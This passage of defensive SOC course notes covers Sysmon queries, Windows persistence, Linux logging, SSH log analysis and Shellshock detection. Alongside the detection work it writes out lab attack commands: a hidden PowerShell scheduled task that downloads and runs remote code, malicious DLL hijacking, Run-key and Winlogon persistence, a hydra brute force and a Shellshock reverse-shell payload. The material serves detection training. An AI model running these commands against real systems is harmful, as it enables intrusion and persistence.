Get-SysmonEvent 1 "10/29/2021 12:33:41" | Where-Object { $_.properties[19].value -eq 3140 } | Format-List
```

`rundll32.exe` is executed from our `VindowsUpdate` service with a `PID` of `3332`. The `rundll32.exe` file loads DLLs in the Windows environment. In this case, it is the staged Meterpreter DLL payload.

Investigate `NetworkConnect` events with the same filter parameters for PID

```pwsh
Get-SysmonEvent 3 "10/29/2021 12:33:41" | Where-Object { $_.properties[3].value -eq 3332 } | Format-List
```

A defender could watch for changes or additions to key values in `HKLM\System\CurrentControlSet\Services\`.

Look for a `ProcessCreate` event where the `ParentImage` is `dropper.exe`.

```pwsh
Get-SysmonEvent 1 | Where-Object { $_.properties[20].value -like "*dropper.exe*" } | Format-List
```

Look for a `FileCreate` event. Filter on the `Image` field containing a filename that matches `rundll32.exe`

```pwsh
Get-SysmonEvent 11 | Where-Object { $_.properties[4].value -like "*rundll32.exe*" } | Format-List
```

Look for a `DnsQuery` event where the Image field contains the file `exercise_service.exe`.

```pwsh
Get-SysmonEvent 22 | Where-Object { $_.properties[7].value -like "*exercise_service.exe*" } | Format-List
```

Look for a `NetworkConnect` event within the same minute of the `DnsQuery` event where the destination IP is `192.168.51.50`

```pwsh
Get-SysmonEvent 3 | Where-Object { $_.properties[14].value -eq "192.168.51.50" } | Format-List
```

### Persisting via Scheduled Tasks

```pwsh
schtasks /query /tn MicrosoftEdgeUpdateTaskMachineCore
```

Scheduled tasks are  stored in `C:\Windows\System32\Tasks` and are accessible only with Administrative privileges. E.g., `C:\Windows\System32\Tasks\MicrosoftEdgeUpdateTaskMachineCore`

```bat
schtasks /create /tn WindowzUpdate /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://kali:8000/eviltask'''))'" /sc minute /ru System /rl HIGHEST
```

`Event 4698` indicates that a new scheduled task was installed.

```pwsh
Get-SecurityEvent 4698 "11/12/2021 7:26:00" "11/12/2021 7:27:00" | Format-List
```

Examine the `ProcessCreate` (`schtasks` command)

```pwsh
Get-SysmonEvent 1 "11/12/2021 7:26:02" "11/12/2021 7:26:04" | Format-List
```

`FileCreate` event: `C:\Windows\System32\Tasks\WindowzUpdate` file creation from `svchost.exe`

```pwsh
Get-SysmonEvent 11 "11/12/2021 7:26:02" "11/12/2021 7:26:04" | Format-List
```

`ProcessCreate` event

```pwsh
Get-SysmonEvent 1 "11/12/2021 7:29:00" "11/12/2021 7:29:30" | Format-List
```

`DNSEvent, NetworkConnect`

```pwsh
Get-SysmonEvent 22 "11/12/2021 7:29:00" "11/12/2021 7:29:30" | Format-List
Get-SysmonEvent 3 "11/12/2021 7:29:00" "11/12/2021 7:29:30" | Format-List
```

Find the `FileCreate` event where the `TargetFilename` matches the command listed in the newly-created Scheduled Task

```pwsh
Get-SysmonEvent 11 | Where-Object { $_.properties[5].value -like "*exercise_schedtask.exe*" } | Format-List
```

Find a ProcessCreate event where the `Image` matches the command in the newly-created scheduled task

```pwsh
Get-SysmonEvent 1 | Where-Object { $_.properties[4].value -like "*exercise_schedtask.exe*" } | Format-List
```

### Persisting by DLL-Sideloading/Hijacking

For both of these techniques, the vulnerability lies with **DLL search order**.

When Windows loads a DLL for an application, the OS follows a series of checks to locate the DLL.

1. The OS checks if the DLL has been loaded into memory.

2. The system will review a list of known DLLs in `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`, which stores the names and locations of commonly-used DLLs (located in `C:\Windows\system32`).

3. What happens next in the search for a DLL depends on whether the `SafeDllSearchMode` key in `HKLM\System\CurrentControlSet\Control\Session Manager\` is enabled or disabled.

- By default, `SafeDllSearchMode` is enabled. Windows will search for the DLL in the directory where the program was executed, followed by System directories and the Windows directory.

- If `SafeDllSearchMode` is disabled, Windows will search where the program was executed as well as the **current directory** of the user (if applicable), before System directories and the Windows directory.

**DLL sideloading**: the malicious DLL is placed in the same directory as the application itself.

**DLL hijacking**: instead of placing the malicious DLL alongside the application, the DLL is inserted somewhere along the sequence of directories that Windows checks.

E.g., DLL hijacking involves the On-Screen Keyboard accessibility feature in Windows. One of the DLLs is `HID.dll`, a USB interface library that supports control between USB devices and whatever application requires them.

When the On-Screen Keyboard is loaded, Windows begins its search for all DLLs, including `HID.dll`. However, Windows first looks in `C:\Program Files\Common Files\microsoft shared\ink` for the DLL before moving on to `C:\Windows\System32`. Under normal circumstances, the DLL will be found in the System32 directory and execution of the application succeeds. However, an attacker with sufficient privileges could store a malicious DLL in the ink subdirectory and hijack the DLL search order.

```bat
copy "C:\tools\windows_persistence\prst_dllshell443.dll" "C:\Program Files\Common Files\microsoft shared\ink\HID.dll"

osk
```

`FileCreate` event was generated when we wrote HID.dll to the new directory

```pwsh
Get-SysmonEvent 11 "11/18/2021 9:03:23" "11/18/2021 9:03:25" | Format-List
```

Search for `ProcessCreate` events in which the parent image is `osk.exe`.

```pwsh
Get-SysmonEvent 1 "11/18/2021 9:03:24" | Where-Object { $_.properties[20].value -like "*osk*" } | Format-List
```

search for `NetworkConnect` events where the `Image` field contains the file

```pwsh
Get-SysmonEvent $null "11/18/2021 10:22:06" | Where-Object { $_.properties[4].value -like "*rundll32.exe*" } | Format-List
```

Look for the `ProcessCreate` events with On-Screen Keyboard's file in the `Image` field.

```pwsh
Get-SysmonEvent 1 | Where-Object { $_.properties[4].value -like "*osk*" } | Format-List
```

Look for a `CreateRemoteThread` event where the `TargetImage` matches the new process

```pwsh
Get-SysmonEvent 8 | Where-Object { $_.properties[6].value -like "*lsass.exe*" } | Format-List
```

## Persistence in Registry

### Using Run Keys

When a user logs in to the system, the programs listed in these keys are automatically run:

- `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce`

The `RunOnce` key is cleared after a user logs on. => not viable for persistence.

The `Run` key will persist no matter how many times the user logs on.

`RunOnceEx`: The program listed in this key will run once, but it will not be cleared until the program has completed execution.

The `HKEY_CURRENT_USER` hive contains data specific to the user that is currently logged in. This includes the Run/RunOnce keys, which are specific to that one user currently logged in to the endpoint.

The `HKEY_LOCAL_MACHINE` hive maintains configuration information for the endpoint itself, and has Run/RunOnce keys that will execute when any user logs in.

```bat
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
```

```bat
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdote /t REG_SZ /d "C:\tools\windows_persistence\prst_runshell443.exe" /f
```

Examine the `ProcessCreate` event (`reg add`)

```pwsh
Get-SysmonEvent 1 "11/15/2021 8:49:11" "11/15/2021 8:49:13" | Format-List
```

`Registry` events

```pwsh
Get-SysmonEvent 13 "11/15/2021 8:49:11" "11/15/2021 8:49:13" | Format-List
```

Search for a Logon event (`Event 4624`) with a Logon Type of `10` and the authenticating user is `Administrator`

```pwsh
Get-SecurityEvent 4624 | Where-Object { $_.properties[8].value -eq 10 -and $_.properties[5].value -eq "Administrator" }
```

Search for `ProcessCreate` events containing the filename `prst_runshell443.exe` in the `Image` field

```pwsh
Get-SysmonEvent 1 "11/15/2021 11:42:10" | Where-Object { $_.properties[4].value -like "*prst_runshell443.exe*" } | Format-List
```

Find a `ProcessCreate` event where the `ParentCommandLine` contains the file listed in the `Run` key that has been created.

```pwsh
Get-SysmonEvent 1 | Where-Object { $_.properties[21].value -like "*farmer.vbs*" } | Format-List
```

Find a `NetworkConnect` event where the Image field contains the file `squeaker.exe`

```pwsh
Get-SysmonEvent 3 | Where-Object { $_.properties[4].value -like "*squeaker.exe*" } | Format-List
```

### Using Winlogon Helper

When authenticating to a Windows endpoint, the OS relies on the Windows Logon (Winlogon) process.

Winlogon controls everything between the load of a user profile and the unlocking of the workstation.

Winlogon draws from information stored in the `HKEY_CURRENT_USER` hive when creating the separation of duties for a logged in user, but its own configuration is in `HKEY_LOCAL_MACHINE`.

It is stored at `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` and contains several subkeys that are applicable to every user that authenticates.

3 of them are at risk for abuse:

- The `Shell` subkey refers to the executable to run as the default shell for users logging in to Windows. The default value in this key is `explorer.exe`. Logging in to a workstation or accessing the system via Remote Desktop will invoke the default shell for any user. If a malicious executable is added to the default shell value, it will be loaded alongside the default shell.

- The `UserInit` subkey points to an executable that Winlogon uses for every user that logs in. The default executable (`userinit.exe`) will run the default shell as well as load the fonts, colors, and wallpaper for the current user.

- The `Notify` subkey exists by default in older versions of Windows up to Windows 7. This subkey contains keys and other configuration entries for Winlogon's notification packages. Attackers could change the value of the `DLLName` subkey to a malicious DLL, which Winlogon will load.

```bat
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, C:\tools\windows_persistence\prst_winlogshell443.exe" /f
```

`ProcessCreate` event (`reg.exe`)

```pwsh
Get-SysmonEvent 1 "11/17/2021 12:24:29" "11/17/2021 12:24:31" | Format-List
```

`RegistryEvent`

```pwsh
Get-SysmonEvent 13 "11/17/2021 12:24:29" "11/17/2021 12:24:31" | Format-List
```

`ProcessCreate` event (ParentImage is `userinit.exe`)

```pwsh
Get-SysmonEvent 1 "11/17/2021 12:24:30" | Where-Object { $_.properties[4].value -like "*winlogshell443.exe*" } | Format-List
```

=> Searching for processes where the ParentImage is `userinit.exe` but the `Image` is not `explorer.exe` might find anomalous processes enabling persistence.


# Linux Endpoint Introduction

```bash
vncviewer 192.168.51.13:5901
```

## Logging on Linux and the Syslog Framework

On Linux systems, log files are usually saved within the `/var/log` folder:
-	`rsyslog/journal`: logs generated by the log manager.
-	Kernel logs: : events generated by the Linux kernel.
-	Audit logs: specially-crafted kernel logs generated by the audit daemon.
-	Applications/Daemons Logs: sshd, firewalld, and application-specific logs, such as Apache and MySQL.

Note: above categories can span multiple files. E.g., kernel logs appear in both audit and messages log files.

| PURPOSE	        | SOURCE PROCESS   | CENTOS LOCATION | UBUNTU LOCATION |
| --------------- | ---------------- | --------------- | --------------- |
| Authentication  | sudo, sshd, etc. | secure | auth.log |
| Web Server      | apache           | httpd/ | apache2/ |
| System Logs     | systemd, kernel, rsyslogd | messages | syslog |
| Package management Logs | dpkg    | yum.log | dpkg.log |

```bash
sudo grep sshd /var/log/secure
```

The **Syslog Daemon** is responsible for receiving syslog messages from local applications through either the traditional `/dev/log` socket or via the more recent **systemd-journald** module.

It can then write them to specific log files, typically contained in the `/var/log` folder and, if configured, forward them through a transport protocol to one or more syslog servers for centralized log collection.

Multiple log management solutions derived from the initial syslog architecture: rsyslog, syslog-ng and nxlog.

=> **rsyslog** has become the de-facto standard on many Linux distributions.

The 1st attempt to standardize log file formatting (**RFC3164**) introduced fields such as priority number, timestamp, and hostname, among others.

An official standard was formalized later via **RFC5424**, most log management applications remain backwards-compatible to the fields specified by RFC3164.

rsyslog configuration on the CentOS machine under the `/etc/rsyslog.conf.rfc` file translates any raw message entering `/var/log/messages` into an **RFC3164**-like format

```
...
#### RULES ####
$template RFC3164fmt,"<%PRI%>%TIMESTAMP% %HOSTNAME% %syslogtag%%msg%\n"
...
# The authpriv file has restricted access.
authpriv.*                                              /var/log/secure;RFC3164fmt
...
# Forwarding to remote syslog collectors
# ----------------------------
#*.*	@linux01     # udp transport
#*.*	@@linux01    # tcp transport
```

Make a backup of the current configuration > copy the custom configuration to our target > restart the rsyslog service

```bash
sudo cp /etc/rsyslog.conf /etc/rsyslog.conf.old
sudo cp /etc/rsyslog.conf.rfc /etc/rsyslog.conf
sudo systemctl restart rsyslog
```

RFC3164 syslog format:
-	**Priority**: "<86>" - This value is a combined value derived by the **facility** and the **severity** fields. The resulting **priority** value indicates the importance of the message (the lower the value, the higher the priority).
- **Timestamp**: "Jun 28 12:05:21" - Indicates the original time and date the log message was generated.
-	**Hostname** - Describes which host initially generated the log event. This field is important when correlating events on a syslog server that gathers logs from multiple hosts.
- App name: "sshd" - Indicates from which process the log event originated.
-	Process id - the process ID related to the application: might be important to trace back the log message's originating process.
-	message "Failed password for offsec from 192.168.51.50 port 54209 ssh2"

### Syslog Facilities Codes

The facility code specifies the program that first generated the log entry, which ranges from 0 to 23.

| FACILITY CODE |	KEYWORD	| DESCRIPTION |
| -- | ---- | ---- |
| 0  | kern | Kernel messages |
| 1	 | user	| User-level messages |
| 2  | mail	| Mail system |
| 3	 | daemon	| System daemons |
| 4	 | auth	| Security/authentication messages |
| 5	 | syslog	| Messages generated internally by syslogd |
| 6	 | lpr | Line printer subsystem |
| 7	 | news	| Network news subsystem |
| 8	 | uucp	| UUCP subsystem |
| 9	 | cron	| Cron subsystem |
| 10 | authpriv	| Security/authentication messages |
| 11 | ftp | FTP daemon |
| 12 | ntp | NTP subsystem |
| 13 | security |	Log audit |
| 14 | console | Log alert |
| 15 |	solaris-cron | Scheduling daemon |
| 16–23	| local0 – local7	| Locally used facilities |

Custom applications may use Facility values from 16 to 23.

### Syslog Severity Levels

The severity level is a numeric value spanning from 0 to 7 that represents the criticality of a syslog event.

| VALUE	| SEVERITY | KEYWORD | DESCRIPTION |
| ---- | ---- | ---- | ---- |
| 0	| Emergency	| emerg | System is unusable - A panic condition |
| 1	| Alert	| alert | Action must be taken immediately |
| 2	| Critical | crit | Critical conditions |
| 3	| Error	| err	| Error conditions |
| 4	| Warning	| warning	| Warning conditions |
| 5	| Notice | notice	| Normal but significant conditions |
| 6	| Informational | info | Informational messages |
| 7 |	Debug | debug | Debug-level messages |

The priority field indicates the importance of the message by deriving its value from the severity and facility parameters using the following formula:

Syslog Priority = (facility * 8) + (severity)

## Rsyslog Meets Journal

2 processes are responsible for log creation and log processing: systemd-journal and rsyslog

The **systemd** software suite has become the de-facto standard for configuration and service management on almost every Linux distribution.

The **systemd_journald**, or journal in short, is one of the components responsible for centralizing log management that aims to eventually replace syslog entirely.

systemd journal compresses log messages into a binary format, as opposed to the plain-text output of syslog.

Rsyslog has replaced the legacy syslog daemon (syslogd) and comes installed by default on nearly every Linux distribution.

To provide backwards compatibility with older UNIX systems, **rsyslog runs in parallel with journal** and reads its syslog messages as they arrive. It then processes and saves them to local files or, if configured, remote servers.

The journal daemon can run solo or in combination with the rsyslog daemon, based on our configuration needs.

Trace the process that has the /var/log/secure log file currently open

```bash
sudo lsof -p $(pgrep syslogd) | grep '/var/log/secure'
```

The original syslog event (generated by the SSH daemon) is forwarded to the journal daemon first, after which the rsyslog daemon reads from the journal logs via the **imjournal** module.

To confirm that rsyslog reads the syslog messages from journald, examine the `/etc/rsyslog.conf` configuration file.

```
...
#### MODULES ####
	
module(load="imuxsock"
       SysSock.Use="off") # provides support for local system logging (e.g. via logger command)
#module(load="imklog")   # provides kernel logging support (previously done by rklogd)
#module(load"immark")  # provides --MARK-- message capability

# provides access to the systemd journal and file to store the position in the journal
module(load="imjournal" StateFile="imjournal.state")
...
```

Note that although Ubuntu systems adopt the traditional **imuxsock** module as the default rsyslog configuration, the end result is equivalent to CentOS', as they both result in two identical copies of the same log event, with one copy in the rsyslog log file and another copy in the journal logs.

```bash
journalctl -u sshd.service --since "1 hour ago"
sudo tail /var/log/secure
```

## Web Daemon Logging

Each time we access a resource, such as a web page running on an Apache server, an access log is generated under `/var/log/httpd/access_log`, or for CentOS or Ubuntu, `/var/log/apache2/access.log`.

```bash
sudo systemctl start httpd
```

```bash
sudo cat /var/log/httpd/access_log
```

```
192.168.51.50  - - [12/Jul/2021:08:57:30 -0400] "GET / HTTP/1.1" 403 199691 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
```

Apache logs follow the **Combined Log Format** (CLF) syntax, meaning each field is delimited by a hyphen (-) or a blank space.
-	192.168.51.50 : The source IP that requested the web resource
-	\- -: As Remote Log Name and User ID do not appear in the log, these are replaced with a hyphen (-)
-	[12/Jul/2021:08:57:30 -0400]: Date and Time Zone (timestamp)
-	GET: Request method
-	/: The resource path, in this case the web server's root folder
-	HTTP/1.1: Request version
-	403: Response status3
-	199691: The resource size
-	\- : Since the referer of the resource is also not present, it is replaced with a hyphen (-)
-	Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0: Client User Agent

Extract all logs with a Response Status of 403

```bash
sudo cat /var/log/httpd/access_log | grep " 403 "
```

Extract a single log parameter, such as the path to the requested resource

```bash
sudo cat /var/log/httpd/access_log  | cut -d " " -f 7
```

Find the mod_ssl related error under the `/var/log/httpd/error_log` file

## Python for Log Analysis

Create a Python script to search for SSH-related events inside the raw authentication log files.

Regex are special string sequences used by **search** or **search_and_replace** functions, among others, to match patterns within a text in a clear-cut manner.

4 essential regex operators:
-	^ matches position just before the first character of the string
-	$ matches position just after the last character of the string
-	. matches a single character, except the newline (\n) character
-	\* matches preceding match zero or more times

E.g., a simple regex pattern to match every line containing the word "cat", followed by any other combination of characters, would be cat.*.

```bash
sudo python3 ssh_log_parser.py
```

```python
#!/usr/bin/env python

import re
import os.path

centos_ssh_log_file_path = "/var/log/secure"
ubuntu_shh_log_file_path = "/var/log/auth.log"

ssh_log_files = [centos_ssh_log_file_path,ubuntu_shh_log_file_path]

regex = 'sshd\[.*\]'
for log_file in ssh_log_files:
    if os.path.isfile(log_file) :
        with open(log_file, "r") as file:
            for line in file:
                for match in re.finditer(regex, line, re.S):
                    print(line,end = '')
```

```bash
sudo python3 apache_log_parser.py
```

```python
#!/usr/bin/env python

import re
import os.path

centos_apache_log_file_path = "/var/log/httpd/access_log"
ubuntu_shh_log_file_path = "/var/log/apache2/access.log"

apache_log_files = [centos_apache_log_file_path,ubuntu_shh_log_file_path]

regex = '([(\d\.)]+) - - \[(.*?)\] \"(.*?)\" (\d+) (\d+) \"(.*?)\" \"(.*?)\"'
for log_file in apache_log_files:
    if os.path.isfile(log_file):
        with open(log_file, "r") as file:
            for line in file:
                for match in re.finditer(regex, line, re.S):
                    log_line = (re.match(regex, line)).groups()
                        print(log_line[0])
```


The regex consists of 9 capturing patterns, each of which matches a specific pattern of the log line:
-	`([(\d.)]+)` searches for the Source_IP; it matches any sequence of digits of undefined length.
-	`- -` represent Remote Log Name and User Id; it matches two literal hyphens, which stand for empty fields.
-	`[(.*?)]` searches for the timestamp field by examining for any character in between opening and closing square brackets.
-	`(.*?)` searches for the Request_Method, Resource_Path and Request_Version, matching any value in double quotes.
-	`(\d+)` searches for the Response Status by matching any numerical value sequence.
-	`(\d+)` searches for the Resource_Size using the same method as above.
-	`(.*?)` searches for the Referer in literal double quotes.
-	`(.*?)` uses the same matching pattern once again to search for the User Agent comprised between double quotes.

Once we receive a regex match, we need to combine each matched group as a Python tuple to the log_line variable. This will enable us to access each web log field as a positional argument.

E.g., To print the client source IP only: `print(log_line[0])`

## DevOps Tools

Ansible Playbook `log_parser.yml`

```yaml
---
- name: logparser
  hosts: soc200
  tasks:

   - name: list files in folder
     become: yes
     become_user: root
     script: /home/kali/SOC-200/Linux_Endpoint_Introduction/ssh_log_parser.py
     args:
        executable: python3
     register: output
   - debug: var=output.stdout_lines
```

```bash
sudo ansible soc200 -m ping -u offsec  --key-file=/home/kali/.ssh/ansible_rsa
```

```bash
ansible-playbook ./log_parser.yml -u offsec  --key-file='/home/kali/.ssh/ansible_rsa' -K
```

## Hunting for Login Attempts

```bash
sudo cat /var/log/secure | grep "Accepted password"
sudo cat /var/log/secure | grep "Failed password"
```

`sudo python3 ssh_login_check.py`

```python
#!/usr/bin/env python

import re
import os.path

centos_ssh_log_file_path = "/var/log/secure"
ubuntu_shh_log_file_path = "/var/log/auth.log"

ssh_log_files = [centos_ssh_log_file_path,ubuntu_shh_log_file_path]

regex_valid_login = 'sshd\[.*\]*Accepted password'
regex_failed_login = 'sshd\[.*\]*Failed password'
for log_file in ssh_log_files:
    if os.path.isfile(log_file) :
        with open(log_file, "r") as file:
            for line in file:
		            for match in re.finditer(regex_valid_login, line, re.S):
		                print("[*] Valid SSH Login found:\n\t"   + line,end = '')
		            for match in re.finditer(regex_failed_login, line, re.S):
		                print("[!] INVALID SSH Login found:\n\t" + line,end = '')
```

# Linux Server Side Attacks

The SSH password authentication mechanism makes use of the Linux Pluggable Authentication Modules (PAM) library, which is responsible for checking that the password belonging to the requested username corresponds to the one present in the `/etc/shadow` password file.

**Public-key authentication** will be our 1st choice if both it and **password authentication** are enabled and no specific order is configured under the `PreferredAuthentications` directive

```bash
sudo cat /etc/ssh/sshd_config | grep PasswordAuth
```

## Suspicious Logins

Public-key authentication works with a key-pair, composed of a public and a private key.

- The entire key-pair is located on the client
- The server trusts the client by storing only its public key.

During the authentication process, the SSH server first verifies the client's identity through the username and public-key association before sending a random challenge message to the client.

The client then encrypts the server's challenge message with its own private key to send back to the server.

To enable public key authentication on a Linux SSH server,  generate a key-pair on the client host.

```bash
ssh-keygen -t Ed25519
```

Private key (`/home/kali/.ssh/id_ed25519`) needs to be kept undisclosed

Public key (`/home/kali/.ssh/id_ed25519.pub`) is going to uploaded to the SSH server.

Copy the public key to the SSH server along with the username we want to associate it with.

```bash
ssh-copy-id offsec@192.168.51.12
```

The SSH server trust our local public key, map it to the offsec user, and store it inside the `~/.ssh/authorized_keys` under the offsec user's home folder.

```bash
ssh offsec@192.168.51.12 -v
```

Verify the public key authentication configuration section.

```bash
sudo cat /etc/ssh/sshd_config | grep Pubkey
```

Password-only authentication: disable the public key authentication option by un-commenting the line as follows.

```bash
sudo nano /etc/ssh/sshd_config
...
PubkeyAuthentication no
...
PasswordAuthentication yes
```

```bash
sudo systemctl restart sshd
```

```bash
sudo tail -f /var/log/auth.log
```

Public key only authentication:

```bash
sudo nano /etc/ssh/sshd_config
...
PubkeyAuthentication yes
...
PasswordAuthentication no
```

Simulate an invalid public key login:

```bash
ssh offsec@192.168.51.12  -i .ssh/id_ed25519_rogue
```

The **preauth** keyword in square brackets => something went wrong in the pre-authentication process.

Increase the **log verbosity** on the SSH server side

```bash
sudo nano /etc/ssh/sshd_config
...
#LogLevel INFO
LogLevel DEBUG1
```

An explicit message about the offsec user providing a wrong ED25519 public key while authenticating to the server:

```bash
sudo tail -f /var/log/auth.log
```

Both public key and password authentication are enabled

```bash
sudo nano /etc/ssh/sshd_config
...
PubkeyAuthentication yes
...
PasswordAuthentication yes
```

Highlight discrepancies within the logging history

2 principal functions:

- `log_file_parser` parses the log file in search of suspicious and interesting log events,

- `log_line_parser` extrapolates only the critical information such as authentication status, username, and source IP.

Script arguments:

1. The authentication method `log_type` can be either `pubkey`, `password`, or `all`, depending on the event we want to filter.

2. `log_scope` is related to the authentication status and can be either `valid`, `failed`, or `all`.

3. A debugging feature that allows us to translate the original log line in the `verbose` format, or a trimmed down version of it with the `off` option.

`python3 ssh_suspicious_logons.py pubkey failed off`

```python
#!/usr/bin/env python

import re
import sys
import os.path


def usage():
    print("Usage: "   + sys.argv[0] + " [AUTHENTICATION METHOD] [SCOPE] [DEBUG]")
    print("Usage: "   + sys.argv[0] + " [pubkey|password|all] [valid|failed|all] verbose|off")
    print("Example: " + sys.argv[0] + " pubkey failed off")
    sys.exit()

def log_line_parser(line):
    global debug
    match0 = re.search('^(...).(..).(..:..:..)',line)
    match1 = re.search('for(.+?)from', line)
    match2 = re.search('from(.+?)port', line)
    match3 = re.search('sshd\[.*\]:(.+?)for',line)
    timestamp   = match0.group()
    username    = match1.group(1)
    ipaddress   = match2.group(1)
    auth_result = match3.group(1)
    if debug:
        print(line,end = '')
    else:
        print(timestamp + auth_result + username + ipaddress)

def log_file_parser(log_type,log_scope):
    centos_ssh_log_file_path = "/var/log/secure"
    ubuntu_shh_log_file_path = "/var/log/auth.log"

    ssh_log_files = [centos_ssh_log_file_path,ubuntu_shh_log_file_path]

    password_valid_login  = 'sshd\[.*\]*Accepted password'
    password_failed_login = 'sshd\[.*\]*Failed password'
    pubkey_valid_login    = 'sshd\[.*\]*Accepted publickey'
    pubkey_failed_login   = 'sshd\[.*\]*Failed publickey'

    for log_file in ssh_log_files:
        if os.path.isfile(log_file) :
            with open(log_file, "r") as file:
                for line in file:

                    if log_scope == 'valid' or log_scope == 'all':
                        if log_type == 'password' or log_type == 'all':
                            for match in re.finditer(password_valid_login, line, re.S):
                                log_line_parser(line)
                        if log_type == 'pubkey' or log_type == 'all':
                            for match in re.finditer(pubkey_valid_login, line, re.S):
                                log_line_parser(line)

                    if log_scope == 'failed' or log_scope == 'all':
                        if log_type == 'password' or log_type == 'all':
                            for match in re.finditer(password_failed_login, line, re.S):
                                log_line_parser(line)
                        if log_type == 'pubkey' or log_type == 'all':
                            for match in re.finditer(pubkey_failed_login, line, re.S):
                                log_line_parser(line)

if __name__ == '__main__':
    if len(sys.argv) > 3:
        log_type    = sys.argv[1]
        log_scope   = sys.argv[2]
        verbose     = sys.argv[3]

        if verbose == 'verbose':
            debug = True
        else:
            debug = False
        log_file_parser(log_type,log_scope)

    else:
        usage()
```

## Password Brute Forcing

Empty a log file

```bash
sudo truncate /var/log/auth.log --size 0
```

```bash
hydra -l alice -P ./dict_bf.txt  192.168.51.12 -t 1 ssh
```

```bash
sudo cat /var/log/auth.log | grep "sshd\["
```

The `MaxAuthTries` parameter from the SSH config file matches the total number of failed authentication attempts, which then forces the current session to disconnect.

A threshold value has been reached.

**Disconnecting authenticating user alice 192.168.51.50 port 55762: Too many authentication failures [preauth]**

This threshold value could potentially be employed to trigger either firewall rules or `fail2ban` to enact a lockout period for the targeted accounts.

=> Use this warning message as an indicator for triggering account lockouts.

Upgrade the standard brute forcing attack to a password spraying attack by running the attack with a password dictionary sized just below the lockout threshold against every username within a company.

=> not only allow the attacker to stay under the radar, but also increase the chances of guessing the correct password across multiple accounts.

Password spraying is often more effective than expected as password reuse among multiple accounts is not that uncommon.

hydra's `-u` option, allows us to loop first between users as opposed to passwords.

## Command Injection

```bash
sudo truncate /var/log/apache2/*.log --size 0
```

```bash
cat /var/log/apache2/access.log
```

**Shellshock** allows an attacker to execute system commands via an unintended processing of environment variables.

Showcase a CGI-based web server as a compromised vector, which is already preconfigured on the Apache server running, along with the vulnerable Bash version (4.3).

```bash
./shellshock.py payload=reverse rhost=192.168.51.12 lhost=192.168.51.50 lport=4444
```

```bash
cat /var/log/apache2/access.log
```

192.168.51.50 - - [02/Aug/2021:03:57:11 -0400] "GET /cgi-bin/index.cgi HTTP/1.1" 200 151 "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/192.168.51.50/4444 0>&1" "-"

The last field of the Apache log format is supposed to be the `User-Agent` field, which is suspiciously empty ("-").

The second-to-last field would normally contain the HTTP `Referer` header, but instead, a reverse-shell attack that connects back to the Kali lab machine.

```bash
sudo ps aux | grep "/bin/bash"
```

The bash process has been invoked by the `www-data` user, which corresponds to the Apache web server process.

`python3 shellshock_log_detector.py`

```python
#!/usr/bin/env python

import re
import os.path

centos_apache_log_file_path = "/var/log/httpd/access_log"
ubuntu_apache_log_file_path = "/var/log/apache2/access.log"
ubuntu_custom_log_file_path = "/var/log/apache2/with_cookies.log"

apache_log_files = [centos_apache_log_file_path,ubuntu_apache_log_file_path,ubuntu_custom_log_file_path]

web_log_regex = '([(\d\.)]+) - - \[(.*?)\] \"(.*?)\" (\d+) (\d+) \"(.*?)\" \"(.*?)\"'
shellshock_regex = '\(\)\s*\t*\{.*;\s*\}\s*;'
for log_file in apache_log_files:
        if os.path.isfile(log_file) :
                with open(log_file, "r") as file:
                    for line in file:
                        for match in re.finditer(web_log_regex, line, re.S):
                            log_line = (re.match(web_log_regex, line)).groups()
                            for match in re.finditer(shellshock_regex, log_line[5], re.S):
                                if log_line[3] != '200':
                                    print("[!] - Shellshock attempt DETECTED in %s" % log_file)
                                elif log_line[3] == '200':
                                    print("[!] - Shellshock attack  SUCCEDED in %s" % log_file)
                                    print(log_line)
```

The Shellshock attack vector embeds the payload inside the `Referer` HTTP Header, but can also store it in any part of the HTTP Request, such as the `Cookie` header, as long as the web server processes it and triggers the vulnerability.

```bash
./shellshock_cookie.py payload=reverse rhost=192.168.51.12 lhost=192.168.51.50 lport=4444
```

```bash
sudo cat /var/log/apache2/access.log
```

Surprisingly, we now lack all kinds of evidence around the attacker's Shellshock payload as the `Referer` payload is now empty.

The default Apache logging behavior doesn't save any information about the `Cookie` HTTP header => a stealthier approach.

Integrate the Apache configuration with a custom logging format that supports the Cookie header and saves the log events into a separate file.

Changes needed in the vhost configuration file.

```bash
cat /etc/apache2/sites-enabled/000-default.conf
```

```
<VirtualHost *:80>
...
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

 	LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\" \"%{Cookie}i\" with_cookies
	CustomLog /var/log/apache2/with_cookies.log with_cookies
	
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

```bash
cat /var/log/apache2/with_cookies.log
```

`python3 shellshock_log_detector_cookies.py`

```python
#!/usr/bin/env python

import re
import os.path

centos_apache_log_file_path = "/var/log/httpd/access_log"
ubuntu_apache_log_file_path = "/var/log/apache2/access.log"
ubuntu_custom_log_file_path = "/var/log/apache2/with_cookies.log"

apache_log_files = [ubuntu_custom_log_file_path]

web_log_regex_cookie = '([(\d\.)]+) - - \[(.*?)\] \"(.*?)\" (\d+) (\d+) \"(.*?)\" \"(.*?)\" \"(.*?)\"'
shellshock_regex = '\(\)\s*\t*\{.*;\s*\}\s*;'
for log_file in apache_log_files:
        if os.path.isfile(log_file) :
